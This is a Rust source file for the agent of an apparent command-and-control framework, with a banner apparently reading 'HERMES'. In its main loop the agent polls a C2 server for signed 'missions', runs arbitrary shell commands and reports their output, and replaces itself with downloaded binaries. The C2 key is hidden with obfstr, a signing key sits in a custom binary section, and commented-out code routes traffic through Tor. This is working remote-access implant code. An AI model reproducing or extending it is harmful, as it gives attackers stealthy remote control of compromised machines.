// #![windows_subsystem = "windows"] // TODO Check whether this is necessary
use std::{env, fs, path::Path, thread, time};

// use arti_client::{TorClient, TorClientConfig};
// use arti_hyper::ArtiHttpConnector;
use base64::{prelude::BASE64_STANDARD, Engine as _};
use common::{client, crypto, model};
use log::{error, info};
// use futures::{Stream, StreamExt};
// use hyper::Body;
// use tls_api::{TlsConnector as TlsConnectorTrait, TlsConnectorBuilder};
// use tls_api_openssl::TlsConnector;

// #[cfg(debug_assertions)]
// struct MissionStream;

// #[cfg(not(debug_assertions))]
// struct MissionStream {
//     tor_client: TorClient<PreferredRuntime>,
// }

// #[cfg(not(debug_assertions))]
// impl MissionStream {
//     fn new() -> Self {
//         MissionStream {
//             tor_client: TorClient::create_bootstrapped(TorClientConfig::default()),
//         }
//     }
// }

// #[cfg(not(debug_assertions))]
// impl Stream for MissionStream {
//     type Item = Vec<Mission>;

//     fn poll_next(
//         self: std::pin::Pin<&mut Self>,
//         cx: &mut std::task::Context<'_>,
//     ) -> std::task::Poll<Option<Self::Item>> {
//         let http = hyper::Client::new();
//         let mut resp = http.get("localhost:3000".try_into()?).await?;
//         let mut resp = tokio::join!(http.get("localhost:3000".try_into()?));

//         println!("Status: {}", resp.status());
//         let body = hyper::body::to_bytes(resp.body_mut()).await?;
//         println!("Body: {}", std::str::from_utf8(&body)?);
//         cx.waker().wake_by_ref();
//         std::task::Poll::Pending
//     }
// }

// #[tokio::main]
// async fn main() -> anyhow::Result<()> {
//     println!("Starting Arti...");
//     let tor_client = TorClient::create_bootstrapped(TorClientConfig::default()).await?;

//     let tls_connector = TlsConnector::builder()?.build()?;

//     let tor_connector = ArtiHttpConnector::new(tor_client, tls_connector);
//     let http = hyper::Client::builder().build::<_, Body>(tor_connector);

//     println!("Requesting http://icanhazip.com via Tor...");
//     let mut resp = http.get("http://icanhazip.com".try_into()?).await?;
//     println!("Status: {}", resp.status());
//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
//     println!("Body: {}", std::str::from_utf8(&body)?);

//     println!("Requesting http://icanhazip.com without Tor...");
//     let http = hyper::Client::new();
//     let mut resp = http.get("http://icanhazip.com".try_into()?).await?;
//     println!("Status: {}", resp.status());
//     let body = hyper::body::to_bytes(resp.body_mut()).await?;
//     println!("Body: {}", std::str::from_utf8(&body)?);

//     Ok(())
// }

mod error;
mod platform;

type AgentResult<T> = Result<T, error::AgentError>;

#[cfg(windows)]
#[link_section = ".sk"]
#[used]
static mut SECRET_KEY: [u8; crypto::ED25519_SECRET_KEY_SIZE] = [0; crypto::ED25519_SECRET_KEY_SIZE];

fn failsafe_loop(
    signing_key: &mut crypto::SigningKey,
    c2_verifying_key: &crypto::VerifyingKey,
    agent_path: &Path,
) -> AgentResult<()> {
    loop {
        if let Some(mission) = client::missions::get_next(signing_key, c2_verifying_key)? {
            match &mission.task {
                model::Task::Update(release) => {
                    // TODO Update should keep same signing key
                    info!("Updating agent '{}'", agent_path.display());
                    if *release.checksum == common::checksum(agent_path)? {
                        info!("Agent is already up to date");
                        client::missions::report(signing_key, mission, "OK")?;
                        continue;
                    }
                    let new_agent_path = agent_path.with_file_name("agent.new");
                    let bytes = common::decompress(&release.bytes);
                    fs::write(&new_agent_path, bytes)?;
                    self_replace::self_replace(&new_agent_path)?;
                    fs::remove_file(&new_agent_path)?;
                    platform::execute_detached(agent_path, mission)
                        .expect("Failed to restart the agent");
                    break;
                }
                model::Task::Execute(command) => {
                    info!("Executing command: {command}");
                    let output = match platform::execute_cmd(command) {
                        Ok(output) => output.stdout,
                        Err(e) => e.to_string().as_bytes().to_vec(),
                    };
                    client::missions::report(
                        signing_key,
                        mission,
                        &String::from_utf8(output).unwrap(),
                    )?;
                }
                model::Task::Stop => {
                    client::missions::report(signing_key, mission, "OK")?;
                    break;
                }
            }
        }
    }
    Ok(())
}

fn main() -> AgentResult<()> {
    if env::var("RUST_LOG").is_err() {
        env::set_var("RUST_LOG", "info");
    }
    env_logger::init();
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓██████████████▓▒░░▒▓████████▓▒░░▒▓███████▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░       ");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░       ");
    info!("░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░  ░▒▓██████▓▒░ ");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░");
    info!("░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ");
    let agent_path = env::current_exe()?;

    // TODO is_emu
    // TODO Single instance

    #[cfg(windows)]
    #[allow(static_mut_refs)]
    let mut signing_key = crypto::get_signing_key_from(unsafe { &SECRET_KEY });
    #[cfg(not(windows))]
    let mut signing_key = crypto::get_signing_key_from(obfstr::obfbytes!(include_bytes!(concat!(
        env!("OUT_DIR"),
        "/id.key"
    ))));
    let c2_verifying_key = crypto::VerifyingKey::from_bytes(
        BASE64_STANDARD
            .decode(obfstr::obfstr!(
                "IX+xwv+SMQr4QZB8ba1n/fx3W3t5KvHQoCtBJ5HJZuk="
            ))?
            .as_slice()
            .try_into()
            .unwrap(),
    )
    .unwrap();

    if let Some(mission) = std::env::args().nth(1) {
        let mission: model::Mission = serde_json::from_str(&mission)?;
        info!("Agent restarted by mission [{}]", mission.id);
        client::missions::report(&mut signing_key, mission, "OK")?;
    }

    while let Err(e) = failsafe_loop(&mut signing_key, &c2_verifying_key, &agent_path) {
        error!("Error: {e}");
        thread::sleep(time::Duration::from_secs(5));
    }
    info!("Stopping agent");
    Ok(())
}
